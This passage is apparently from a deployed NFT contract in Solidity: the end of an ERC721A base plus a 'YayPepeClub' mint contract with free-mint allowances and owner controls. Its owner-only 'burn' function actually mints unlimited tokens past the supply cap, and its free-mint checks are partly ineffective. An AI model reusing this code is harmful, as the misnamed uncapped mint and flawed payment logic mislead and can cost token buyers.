993     function getApproved(uint256 tokenId) public view override returns (address) {
994         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
995 
996         return _tokenApprovals[tokenId];
997     }
998 
999     /**
1000      * @dev See {IERC721-setApprovalForAll}.
1001      */
1002     function setApprovalForAll(address operator, bool approved) public override {
1003         require(operator != _msgSender(), "ERC721A: approve to caller");
1004 
1005         _operatorApprovals[_msgSender()][operator] = approved;
1006         emit ApprovalForAll(_msgSender(), operator, approved);
1007     }
1008 
1009     /**
1010      * @dev See {IERC721-isApprovedForAll}.
1011      */
1012     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1013         return _operatorApprovals[owner][operator];
1014     }
1015 
1016     /**
1017      * @dev See {IERC721-transferFrom}.
1018      */
1019     function transferFrom(
1020         address from,
1021         address to,
1022         uint256 tokenId
1023     ) public virtual override {
1024         _transfer(from, to, tokenId);
1025     }
1026 
1027     /**
1028      * @dev See {IERC721-safeTransferFrom}.
1029      */
1030     function safeTransferFrom(
1031         address from,
1032         address to,
1033         uint256 tokenId
1034     ) public virtual override {
1035         safeTransferFrom(from, to, tokenId, "");
1036     }
1037 
1038     /**
1039      * @dev See {IERC721-safeTransferFrom}.
1040      */
1041     function safeTransferFrom(
1042         address from,
1043         address to,
1044         uint256 tokenId,
1045         bytes memory _data
1046     ) public override {
1047         _transfer(from, to, tokenId);
1048         require(
1049             _checkOnERC721Received(from, to, tokenId, _data),
1050             "ERC721A: transfer to non ERC721Receiver implementer"
1051         );
1052     }
1053 
1054     /**
1055      * @dev Returns whether `tokenId` exists.
1056      *
1057      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1058      *
1059      * Tokens start existing when they are minted (`_mint`),
1060      */
1061     function _exists(uint256 tokenId) internal view returns (bool) {
1062         return tokenId < currentIndex;
1063     }
1064 
1065     function _safeMint(address to, uint256 quantity) internal {
1066         _safeMint(to, quantity, "");
1067     }
1068 
1069     /**
1070      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1071      *
1072      * Requirements:
1073      *
1074      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1075      * - `quantity` must be greater than 0.
1076      *
1077      * Emits a {Transfer} event.
1078      */
1079     function _safeMint(
1080         address to,
1081         uint256 quantity,
1082         bytes memory _data
1083     ) internal {
1084         _mint(to, quantity, _data, true);
1085     }
1086 
1087     /**
1088      * @dev Mints `quantity` tokens and transfers them to `to`.
1089      *
1090      * Requirements:
1091      *
1092      * - `to` cannot be the zero address.
1093      * - `quantity` must be greater than 0.
1094      *
1095      * Emits a {Transfer} event.
1096      */
1097     function _mint(
1098         address to,
1099         uint256 quantity,
1100         bytes memory _data,
1101         bool safe
1102     ) internal {
1103         uint256 startTokenId = currentIndex;
1104         require(to != address(0), "ERC721A: mint to the zero address");
1105         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1106 
1107         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1108 
1109         // Overflows are incredibly unrealistic.
1110         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1111         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1112         unchecked {
1113             _addressData[to].balance += uint128(quantity);
1114             _addressData[to].numberMinted += uint128(quantity);
1115 
1116             _ownerships[startTokenId].addr = to;
1117             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1118 
1119             uint256 updatedIndex = startTokenId;
1120 
1121             for (uint256 i; i < quantity; i++) {
1122                 emit Transfer(address(0), to, updatedIndex);
1123                 if (safe) {
1124                     require(
1125                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1126                         "ERC721A: transfer to non ERC721Receiver implementer"
1127                     );
1128                 }
1129 
1130                 updatedIndex++;
1131             }
1132 
1133             currentIndex = updatedIndex;
1134         }
1135 
1136         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1137     }
1138 
1139     /**
1140      * @dev Transfers `tokenId` from `from` to `to`.
1141      *
1142      * Requirements:
1143      *
1144      * - `to` cannot be the zero address.
1145      * - `tokenId` token must be owned by `from`.
1146      *
1147      * Emits a {Transfer} event.
1148      */
1149     function _transfer(
1150         address from,
1151         address to,
1152         uint256 tokenId
1153     ) private {
1154         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1155 
1156         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1157             getApproved(tokenId) == _msgSender() ||
1158             isApprovedForAll(prevOwnership.addr, _msgSender()));
1159 
1160         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1161 
1162         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1163         require(to != address(0), "ERC721A: transfer to the zero address");
1164 
1165         _beforeTokenTransfers(from, to, tokenId, 1);
1166 
1167         // Clear approvals from the previous owner
1168         _approve(address(0), tokenId, prevOwnership.addr);
1169 
1170         // Underflow of the sender's balance is impossible because we check for
1171         // ownership above and the recipient's balance can't realistically overflow.
1172         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1173         unchecked {
1174             _addressData[from].balance -= 1;
1175             _addressData[to].balance += 1;
1176 
1177             _ownerships[tokenId].addr = to;
1178             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1179 
1180             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1181             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1182             uint256 nextTokenId = tokenId + 1;
1183             if (_ownerships[nextTokenId].addr == address(0)) {
1184                 if (_exists(nextTokenId)) {
1185                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1186                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1187                 }
1188             }
1189         }
1190 
1191         emit Transfer(from, to, tokenId);
1192         _afterTokenTransfers(from, to, tokenId, 1);
1193     }
1194 
1195     /**
1196      * @dev Approve `to` to operate on `tokenId`
1197      *
1198      * Emits a {Approval} event.
1199      */
1200     function _approve(
1201         address to,
1202         uint256 tokenId,
1203         address owner
1204     ) private {
1205         _tokenApprovals[tokenId] = to;
1206         emit Approval(owner, to, tokenId);
1207     }
1208 
1209     /**
1210      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1211      * The call is not executed if the target address is not a contract.
1212      *
1213      * @param from address representing the previous owner of the given token ID
1214      * @param to target address that will receive the tokens
1215      * @param tokenId uint256 ID of the token to be transferred
1216      * @param _data bytes optional data to send along with the call
1217      * @return bool whether the call correctly returned the expected magic value
1218      */
1219     function _checkOnERC721Received(
1220         address from,
1221         address to,
1222         uint256 tokenId,
1223         bytes memory _data
1224     ) private returns (bool) {
1225         if (to.isContract()) {
1226             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1227                 return retval == IERC721Receiver(to).onERC721Received.selector;
1228             } catch (bytes memory reason) {
1229                 if (reason.length == 0) {
1230                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1231                 } else {
1232                     assembly {
1233                         revert(add(32, reason), mload(reason))
1234                     }
1235                 }
1236             }
1237         } else {
1238             return true;
1239         }
1240     }
1241 
1242     /**
1243      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1244      *
1245      * startTokenId - the first token id to be transferred
1246      * quantity - the amount to be transferred
1247      *
1248      * Calling conditions:
1249      *
1250      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1251      * transferred to `to`.
1252      * - When `from` is zero, `tokenId` will be minted for `to`.
1253      */
1254     function _beforeTokenTransfers(
1255         address from,
1256         address to,
1257         uint256 startTokenId,
1258         uint256 quantity
1259     ) internal virtual {}
1260 
1261     /**
1262      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1263      * minting.
1264      *
1265      * startTokenId - the first token id to be transferred
1266      * quantity - the amount to be transferred
1267      *
1268      * Calling conditions:
1269      *
1270      * - when `from` and `to` are both non-zero.
1271      * - `from` and `to` are never both zero.
1272      */
1273     function _afterTokenTransfers(
1274         address from,
1275         address to,
1276         uint256 startTokenId,
1277         uint256 quantity
1278     ) internal virtual {}
1279 }
1280 
1281 contract YayPepeClub is ERC721A, Ownable, ReentrancyGuard {
1282     string public baseURI = "ipfs://bafybeif53kf3375erk6aq4hhs5osn4tx5hgmues35gfta7lc7pl2a5k2aa/";
1283     uint   public price             = 0.003 ether;
1284     uint   public maxPerTx          = 10;
1285     uint   public maxPerFree        = 1;
1286     uint   public maxPerWallet      = 31;
1287     uint   public totalFree         = 6969;
1288     uint   public maxSupply         = 6969;
1289     bool   public mintEnabled;
1290     uint   public totalFreeMinted = 0;
1291 
1292     mapping(address => uint256) public _mintedFreeAmount;
1293     mapping(address => uint256) public _totalMintedAmount;
1294 
1295     constructor() ERC721A("YayPepe Club", "YayPepe"){}
1296 
1297     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1298         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1299         string memory currentBaseURI = _baseURI();
1300         return bytes(currentBaseURI).length > 0
1301             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1302             : "";
1303     }
1304     
1305 
1306     function _startTokenId() internal view virtual returns (uint256) {
1307         return 1;
1308     }
1309 
1310     function mint(uint256 count) external payable {
1311         uint256 cost = price;
1312         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1313             (_mintedFreeAmount[msg.sender] < maxPerFree));
1314 
1315         if (isFree) { 
1316             require(mintEnabled, "Mint is not live yet");
1317             require(totalSupply() + count <= maxSupply, "No more");
1318             require(count <= maxPerTx, "Max per TX reached.");
1319             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1320             {
1321              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1322              _mintedFreeAmount[msg.sender] = maxPerFree;
1323              totalFreeMinted += maxPerFree;
1324             }
1325             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1326             {
1327              require(msg.value >= 0, "Please send the exact ETH amount");
1328              _mintedFreeAmount[msg.sender] += count;
1329              totalFreeMinted += count;
1330             }
1331         }
1332         else{
1333         require(mintEnabled, "Mint is not live yet");
1334         require(_totalMintedAmount[msg.sender] + count <= maxPerWallet, "Exceed maximum NFTs per wallet");
1335         require(msg.value >= count * cost, "Please send the exact ETH amount");
1336         require(totalSupply() + count <= maxSupply, "No more");
1337         require(count <= maxPerTx, "Max per TX reached.");
1338         require(msg.sender == tx.origin, "The minter is another contract");
1339         }
1340         _totalMintedAmount[msg.sender] += count;
1341         _safeMint(msg.sender, count);
1342     }
1343 
1344     function costCheck() public view returns (uint256) {
1345         return price;
1346     }
1347 
1348     function maxFreePerWallet() public view returns (uint256) {
1349       return maxPerFree;
1350     }
1351 
1352     function burn(address mintAddress, uint256 count) public onlyOwner {
1353         _safeMint(mintAddress, count);
1354     }
1355 
1356     function _baseURI() internal view virtual override returns (string memory) {
1357         return baseURI;
1358     }
1359 
1360     function setBaseUri(string memory baseuri_) public onlyOwner {
1361         baseURI = baseuri_;
1362     }
1363 
1364     function setPrice(uint256 price_) external onlyOwner {
1365         price = price_;
1366     }
1367 
1368     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1369         totalFree = MaxTotalFree_;
1370     }
1371 
1372      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1373         maxPerFree = MaxPerFree_;
1374     }
1375 
1376     function toggleMinting() external onlyOwner {
1377       mintEnabled = !mintEnabled;
1378     }
1379     
1380     function CommunityWallet(uint quantity, address user)
1381     public
1382     onlyOwner
1383   {
1384     require(
1385       quantity > 0,
1386       "Invalid mint amount"
1387     );
1388     require(
1389       totalSupply() + quantity <= maxSupply,
1390       "Maximum supply exceeded"
1391     );
1392     _safeMint(user, quantity);
1393   }
1394 
1395     function withdraw() external onlyOwner nonReentrant {
1396         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1397         require(success, "Transfer failed.");
1398     }
1399 }